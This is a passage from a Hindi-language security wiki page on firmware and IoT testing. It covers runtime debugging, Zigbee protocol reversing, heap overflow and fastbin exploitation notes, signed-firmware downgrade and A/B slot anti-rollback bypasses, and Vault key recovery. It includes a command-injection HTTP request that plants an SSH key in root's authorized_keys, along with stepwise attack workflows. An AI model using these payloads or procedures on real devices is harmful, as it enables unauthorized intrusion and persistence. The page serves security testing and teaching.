बार-बार दोहराए जा सकने वाले fault isolation के लिए, किसी स्थिर writable volume में timestamp वाले marker files लिखें और उन्हें offline verify करें; `/dev/kmsg`, FIFOs और अस्थायी consoles, rate limiting या process के जल्दी बंद हो जाने के कारण false negatives दे सकते हैं। असंबंधित code बदलने से पहले, अलग-अलग layers के सटीक interfaces की तुलना भी करें: `uname -r` बनाम `/lib/modules/`, disk पर मौजूद ext4 features बनाम kernel configuration, और Mesa `libGL` generation बनाम DRI driver ABI तथा PCI से निकले driver names। कोई component मौजूद हो सकता है और `dlopen()` सफलतापूर्वक कर सकता है, फिर भी उपयोग करने योग्य न हो, क्योंकि उसका consumer किसी अलग ABI की अपेक्षा करता है।<sup>[[11]](#references)</sup>

## व्यवहार में Dynamic Analysis

इस चरण में, analysis के लिए असली या emulated device environment का उपयोग किया जाता है। OS और filesystem तक shell access बनाए रखना ज़रूरी है। Emulation hardware interactions को पूरी तरह सही ढंग से न दर्शा पाए, इसलिए कभी-कभी emulation को दोबारा शुरू करना पड़ सकता है। Analysis में filesystem की फिर से जाँच करनी चाहिए, उजागर webpages और network services का exploit करना चाहिए, और bootloader vulnerabilities का पता लगाना चाहिए। संभावित backdoor vulnerabilities की पहचान के लिए firmware integrity tests महत्वपूर्ण हैं।

## Runtime Analysis की तकनीकें

Runtime analysis में किसी process या binary के operating environment में उससे interact किया जाता है। इसके लिए breakpoints सेट करने और fuzzing तथा अन्य तकनीकों से vulnerabilities पहचानने के लिए gdb-multiarch, Frida और Ghidra जैसे tools का उपयोग किया जाता है।

बिना full debugger वाले embedded targets के लिए, device पर **statically-linked `gdbserver` की copy भेजें** और उससे remotely attach करें:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radio-co-processor message mapping

IoT hubs में RF stack अक्सर **radio MCU** और Linux userland process के बीच बँटा होता है। एक उपयोगी workflow है इस path को map करना:<sup>[[8]](#references)</sup>

1. हवा में **RF frame**
2. radio MCU पर **controller-side parser**
3. Linux को भेजा गया **serial/UART text या TLV protocol** (उदाहरण के लिए `/dev/tty*`)
4. मुख्य daemon में **application dispatcher**
5. **protocol-specific handler / state machine**

इस architecture में एक के बजाय दो reversing targets होते हैं। अगर controller binary radio frames को `Group,Command,arg1,arg2,...` जैसे textual protocol में बदलता है, तो पता लगाएँ:

- **message groups** और dispatch tables
- कौन-से messages **network** से आ सकते हैं और कौन-से controller से
- सटीक **manufacturer-specific discriminator fields** (उदाहरण के लिए Zigbee `manufacturer_code` और custom `cluster_command`)
- कौन-से handlers केवल **commissioning**, discovery या firmware/model download phases के दौरान reachable होते हैं

विशेष रूप से Zigbee के लिए, pairing traffic capture करें और जाँचें कि क्या target अब भी default **Link Key** `ZigBeeAlliance09` पर निर्भर है। अगर ऐसा है, तो commissioning traffic sniff करने से **Network Key** उजागर हो सकती है। Zigbee 3.0 install codes इस जोखिम को कम करते हैं, इसलिए नोट करें कि परीक्षण किया गया device वास्तव में उन्हें अनिवार्य करता है या नहीं।

### Manufacturer-specific protocol handlers और FSM-gated reachability

Vendor-specific Zigbee/ZCL commands अक्सर standardized clusters से बेहतर target होते हैं, क्योंकि वे कम battle-tested validation वाले **custom parsing code** और internal **FSMs** तक पहुँचते हैं।<sup>[[8]](#references)</sup>

व्यावहारिक workflow:

- **vendor-only handler** मिलने तक command dispatcher को reverse करें।
- **FSM state**, **event**, **check**, **action** और **next-state** tables निकालें।
- **transitional states** पहचानें, जो अपने-आप आगे बढ़ती हैं, और retry/error branches पहचानें, जो अंततः attacker-controlled state को reset या free करती हैं।
- यह मानने के बजाय कि buggy handler हमेशा reachable है, पुष्टि करें कि daemon को vulnerable state में लाने के लिए किन legitimate protocol exchanges की ज़रूरत है।

Timing-sensitive protocols के लिए, Python framework से packet replay बहुत धीमा हो सकता है। अधिक विश्वसनीय तरीका है कि vendor-grade stack वाले वास्तविक hardware (उदाहरण के लिए **nRF52840**) पर legitimate device emulate करें, ताकि सही **endpoints**, **attributes** और commissioning timing सामने आ सकें।

### Embedded daemons में fragmented-download bug class

Firmware में एक आम bug class **fragmented blob/model/configuration downloads** में दिखाई देती है:<sup>[[8]](#references)</sup>

1. **पहला fragment** (`offset == 0`) `ctx->total_size` store करता है और `malloc(total_size)` allocate करता है।
2. बाद के fragments केवल attacker-controlled **packet-local** fields validate करते हैं, जैसे `packet_total_size >= offset + chunk_len`।
3. Copy में `memcpy(&ctx->buffer[offset], chunk, chunk_len)` का उपयोग होता है, लेकिन **मूल allocated size** के विरुद्ध जाँच नहीं होती।

इससे attacker ये कर सकता है:

- छोटा heap allocation करवाने के लिए **छोटे** घोषित total size वाला पहला valid fragment भेजना।
- बाद में **expected offset** के साथ बड़ा `chunk_len` वाला fragment भेजना।
- ऐसा forged packet-local size देना जो नई जाँचों को पास कर जाए, लेकिन फिर भी मूल allocated buffer को overflow कर दे।

जब vulnerable path commissioning logic के पीछे हो, तो malformed fragments भेजने से पहले target को expected model-download या blob-download state में लाने के लिए पर्याप्त **device emulation** शामिल होनी चाहिए।

### Protocol-driven `free()` triggers

Embedded daemons में heap metadata exploitation trigger करने का सबसे आसान तरीका अक्सर "cleanup का इंतज़ार करना" नहीं, बल्कि **protocol की अपनी error handling को मजबूर करना** होता है:<sup>[[8]](#references)</sup>

- FSM को **retry** या **error** states में पहुँचाने के लिए malformed follow-up fragments भेजें।
- Retry threshold पार करें, ताकि daemon **context reset** करके corrupted buffer को free करे।
- Process के असंबंधित कारणों से crash होने से पहले allocator-side primitives trigger करने के लिए इस predictable `free()` का उपयोग करें।

यह embedded Linux में **musl/uClibc/dlmalloc-like** allocators के विरुद्ध खास तौर पर उपयोगी है, जहाँ chunk metadata corrupt करने से unlink/unbin logic write primitive में बदल सकती है। एक स्थिर तरीका है कि **size field** को इस तरह corrupt करें कि allocator traversal, overflowed buffer के अंदर रखे गए **fake chunks** की ओर जाए; real bin pointers को तुरंत clobber करके process crash करने से बचें।

## Binary Exploitation and Proof-of-Concept

पहचानी गई vulnerabilities के लिए PoC विकसित करने हेतु target architecture की गहरी समझ और lower-level languages में programming की ज़रूरत होती है। Embedded systems में binary runtime protections दुर्लभ हैं, लेकिन मौजूद होने पर Return Oriented Programming (ROP) जैसी techniques की ज़रूरत पड़ सकती है।

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc, glibc जैसे fastbins का उपयोग करता है। बाद का कोई बड़ा allocation `__malloc_consolidate()` trigger कर सकता है, इसलिए किसी भी fake chunk को checks पास करने चाहिए (उचित size, `fd = 0`, और आसपास के chunks "in use" दिखने चाहिए)।<sup>[[6]](#references)</sup>
- **ASLR के तहत non-PIE binaries:** अगर ASLR enabled है, लेकिन मुख्य binary **non-PIE** है, तो binary के अंदर `.data/.bss` addresses स्थिर रहते हैं। आप ऐसी region target कर सकते हैं जो पहले से valid heap chunk header जैसी दिखती हो, ताकि fastbin allocation **function pointer table** पर आ जाए।
- **Parser-stopping NUL:** JSON parse करते समय payload में `\x00` parsing रोक सकता है, जबकि stack pivot/ROP chain के लिए attacker-controlled trailing bytes बने रहते हैं।
- **`/proc/self/mem` के ज़रिए shellcode:** `open("/proc/self/mem")`, `lseek()` और `write()` को call करने वाली ROP chain, किसी ज्ञात mapping में executable shellcode डालकर उस पर jump कर सकती है।

## Firmware Analysis के लिए तैयार Operating Systems

[AttifyOS](https://github.com/adi0x90/attifyos) और [EmbedOS](https://github.com/scriptingxss/EmbedOS) जैसे operating systems firmware security testing के लिए आवश्यक tools से लैस, पहले से configured environments प्रदान करते हैं।

## Firmware का विश्लेषण करने के लिए तैयार OSs

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS एक distro है, जिसका उद्देश्य Internet of Things (IoT) devices का security assessment और penetration testing करने में आपकी मदद करना है। सभी आवश्यक tools से लैस pre-configured environment देकर यह आपका काफी समय बचाता है।
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Ubuntu 18.04 पर आधारित embedded security testing operating system, जिसमें firmware security testing tools पहले से मौजूद हैं।

## Firmware Downgrade Attacks और असुरक्षित Update Mechanisms

भले ही vendor firmware images के लिए cryptographic signature checks लागू करे, **version rollback (downgrade) protection अक्सर छोड़ दी जाती है**। जब boot- या recovery-loader केवल embedded public key से signature verify करता है, लेकिन flash की जा रही image का *version* (या monotonic counter) नहीं जाँचता, तो attacker वैध रूप से **पुराना, vulnerable firmware, जिस पर अब भी valid signature हो**, install कर सकता है और इस तरह patched vulnerabilities को फिर से ला सकता है।<sup>[[4]](#references)</sup>

आम attack workflow:

1. **पुरानी signed image प्राप्त करें**
   * Vendor के public download portal, CDN या support site से लें।
   * Companion mobile/desktop applications से निकालें (उदाहरण के लिए Android APK में `assets/firmware/` के अंदर)।
   * VirusTotal, Internet archives, forums आदि जैसे third-party repositories से प्राप्त करें।
2. किसी भी exposed update channel के ज़रिए image को device पर **upload करें या serve करें**:
   * Web UI, mobile-app API, USB, TFTP, MQTT आदि।
   * कई consumer IoT devices में ऐसे *unauthenticated* HTTP(S) endpoints होते हैं, जो Base64-encoded firmware blobs स्वीकार करते हैं, उन्हें server-side decode करते हैं और recovery/upgrade शुरू करते हैं।
3. Downgrade के बाद, ऐसी vulnerability exploit करें जिसे newer release में patch किया गया था (उदाहरण के लिए बाद में जोड़ा गया command-injection filter)।
4. Persistence हासिल करने के बाद detection से बचने के लिए, वैकल्पिक रूप से latest image वापस flash करें या updates disable कर दें।

### उदाहरण: Downgrade के बाद Command Injection

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

असुरक्षित (downgrade किए गए) firmware में, `md5` पैरामीटर को बिना sanitisation के सीधे shell command में जोड़ दिया जाता है, जिससे arbitrary commands inject करना संभव हो जाता है (यहाँ — SSH key-based root access सक्षम करना)। बाद के firmware versions में एक बुनियादी character filter जोड़ा गया, लेकिन downgrade protection न होने के कारण यह fix बेअसर है।<sup>[[4]](#references)</sup>

### Mobile Apps से Firmware Extract करना

कई vendors अपने companion mobile applications में पूरी firmware images शामिल करते हैं, ताकि app Bluetooth/Wi-Fi के ज़रिए device को update कर सके। ये packages आमतौर पर APK/APEX में `assets/fw/` या `res/raw/` जैसे paths पर unencrypted रूप में stored होते हैं। `apktool`, `ghidra`, या यहाँ तक कि साधारण `unzip` जैसे tools से physical hardware को छुए बिना signed images निकाली जा सकती हैं।<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### A/B slot डिज़ाइनों में केवल updater तक सीमित anti-rollback bypass

कुछ vendors anti-downgrade **ratchet** लागू करते हैं, लेकिन केवल *updater* logic के भीतर (उदाहरण के लिए, CAN पर UDS routine, recovery command या userspace OTA agent)। अगर **bootloader** बाद में केवल image signature/CRC की जाँच करता है और partition table या slot metadata पर भरोसा करता है, तो rollback protection को फिर भी bypass किया जा सकता है।<sup>[[7]](#references)</sup>

आम कमज़ोर डिज़ाइन:

- Firmware metadata में version descriptor और **security ratchet** / monotonic counter, दोनों होते हैं।
- Updater image ratchet की तुलना persistent storage में रखी value से करता है और पुराने signed images को अस्वीकार करता है।
- **Bootloader** उस ratchet को parse **नहीं** करता; boot करने से पहले केवल header, CRC और signature verify करता है।
- Slot activation को partition table या प्रति-slot generation counter में अलग से store किया जाता है और इसे validated firmware के exact digest से **cryptographically bind नहीं** किया जाता।

इससे dual-slot systems में **एक image validate करो / दूसरी image boot करो** primitive बनता है। अगर attacker updater से current signed image के ज़रिए slot B को अगला boot target mark करवा सकता है और reboot से पहले slot B को overwrite कर सकता है, तो bootloader downgrade की गई image को फिर भी boot कर सकता है, क्योंकि वह केवल पहले से commit किए गए slot metadata पर भरोसा करता है।

दुरुपयोग का आम तरीका:

1. Passive slot में **current signed** firmware upload करें और सामान्य validation/switch routine चलाएँ, ताकि layout उस slot को अगला active slot mark करे।
2. **अभी reboot न करें**। उसी session में slot-preparation/erase routine को फिर से चलाएँ।
3. Stale boot-state या stale slot-selection logic का दुरुपयोग करें, ताकि updater उसी **physical slot** को erase कर दे जिसे अभी promote किया गया था।
4. उस slot में **पुराना लेकिन अब भी signed** firmware लिखें।
5. Ratchet लागू करने वाली validation routine को छोड़ें और सीधे reboot करें।
6. Bootloader promoted slot चुनता है, केवल signature/integrity verify करता है और पुरानी image boot करता है।

A/B update implementations को reverse करते समय इन बातों पर ध्यान दें:

- Slot selection **boot-time flags** से निकाला जाता है, जिन्हें सफल switch के बाद refresh नहीं किया जाता।
- `prepare_passive_slot()`-जैसी routine **current committed layout** के बजाय stale state के आधार पर slot erase करती है।
- `part_write_layout()`-जैसा function केवल **generation counter** / active flag बढ़ाता है और validated image hash store नहीं करता।
- Ratchet checks userspace या updater code में लागू हैं, लेकिन ROM / bootloader / secure boot stages में **नहीं**।
- Erase या recovery routines slot का content हटाकर दोबारा लिखे जाने के बाद भी उसे bootable mark रहने देती हैं।

### Update Logic का आकलन करने के लिए Checklist

* क्या *update endpoint* का transport/authentication पर्याप्त रूप से सुरक्षित है (TLS + authentication)?
* क्या device flashing से पहले **version numbers** या **monotonic anti-rollback counter** की तुलना करता है?
* क्या image को secure boot chain के भीतर verify किया जाता है (जैसे ROM code द्वारा signatures की जाँच)?
* क्या **bootloader updater वाला ही ratchet लागू करता है**, या केवल signature/CRC जाँचता है?
* क्या slot activation metadata **validated firmware digest/version से bound** है, या promotion के बाद slot को modify किया जा सकता है?
* Slot switch सफल होने के बाद क्या device को reboot करना अनिवार्य है, या उसी session में बाद की update/erase routines अब भी उपलब्ध रहती हैं?
* क्या userland code अतिरिक्त sanity checks करता है (जैसे allowed partition map, model number)?
* क्या *partial* या *backup* update flows वही validation logic दोबारा इस्तेमाल करते हैं?

> 💡  अगर ऊपर दी गई कोई भी चीज़ अनुपस्थित है, तो platform संभवतः rollback attacks के प्रति vulnerable है।

## अभ्यास के लिए vulnerable firmware

Firmware में vulnerabilities ढूँढ़ने का अभ्यास करने के लिए, शुरुआत के तौर पर इन vulnerable firmware projects का उपयोग करें।

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Embedded KMS/Vault state से firmware decryption keys recover करना

जब कोई update image थोड़े-से plaintext metadata के साथ बड़ा high-entropy blob रखती है, तो कुछ भी brute-force करने से पहले container triage करें:<sup>[[1]](#references)</sup>

- `hexdump`, `xxd`, `strings -tx`, `base64 -d` और `binwalk -E` से headers, offsets और line boundaries dump करें।
- `Salted__` आम तौर पर OpenSSL `enc` format दर्शाता है: अगले 8 bytes salt होते हैं और बाकी bytes ciphertext होते हैं।
- ऐसा Base64 field जो decode होकर ठीक `256` bytes का हो, इस बात का मज़बूत संकेत है कि यह RSA-2048 ciphertext है, जो random firmware password/session key को wrap करता है।
- उसी file में मौजूद Detached PGP material अक्सर केवल authenticity की रक्षा करता है; यह न मानें कि यही confidentiality mechanism है।

अगर static key hunting (`grep`, `strings`, PEM/PGP searches) विफल हो, तो केवल private keys खोजने के बजाय **operational decrypt path** को reverse करें:

- Updater / management binary को decompile करें और trace करें कि encrypted blob कौन पढ़ता है, कौन-सा helper/API उसे unwrap करता है और वह कौन-सा logical key name माँगता है।
- Extracted root filesystem में KMS state (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), साथ ही unit files और init scripts खोजें।
- Plaintext `vault operator unseal ...`, recovery keys, bootstrap tokens या local KMS auto-unseal scripts को private-key material के बराबर मानें।

अगर appliance में मूल Vault binary और storage backend मौजूद हों, तो Vault internals को दोबारा implement करने की तुलना में उस environment को replay करना आम तौर पर आसान होता है:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

KMS के cloned संस्करण पर root access के साथ:

- Transit keys को केवल isolated clone के अंदर exportable बनाएं: `vault write transit/keys/<name>/config exportable=true`
- Unwrap key export करें: `vault read transit/export/encryption-key/<name>`
- Recovered RSA key को KMS द्वारा उपयोग किए गए सटीक padding/hash pair के साथ आज़माएं। PKCS#1 v1.5 decrypt और default OAEP decrypt का विफल होना **यह साबित नहीं करता कि key गलत है**; Vault-backed कई flows SHA-256 के साथ OAEP का उपयोग करते हैं, जबकि आम libraries में default SHA-1 होता है।
- यदि payload `Salted__` से शुरू होता है, तो AES-CBC decryption आज़माने से पहले vendor के OpenSSL KDF (`EVP_BytesToKey`, पुराने appliances में अक्सर MD5) को हूबहू दोहराएं।

इससे "encrypted firmware" एक अधिक सामान्य समस्या बन जाता है: **appliance-side operational keys recover करें, फिर सटीक unwrap + KDF parameters को offline दोहराएं**।

## Training और Certifications

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Claude से Firmware Cracking: Senior-Level Skill, Junior-Level Autonomy](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Firmware Security Testing Methodology](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Practical IoT Hacking: Internet of Things पर हमले करने की Definitive Guide](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [छोड़े गए hardware में zero days का शोषण – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [$20 के Smart Device से मुझे आपके घर का Access कैसे मिला](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [अब आप mi को देख सकते हैं: अब आप Pwned हैं](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Tesla Wall Connector के charge port connector से उसका शोषण - भाग 2: anti-downgrade को bypass करना](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [इसे Blink करें: Philips Hue Bridge का Over-the-Air शोषण](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [QEMU पर ROOT Tesla OS भाग 1: Unpacking](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Linux kernel documentation - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [QEMU पर ROOT Tesla OS भाग 2: Debugging और Fixing](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell BIOS Passwords: कमजोर XOR Encryption से SPI Flash से Recovery संभव (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Dell BIOS password recovery tooling](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
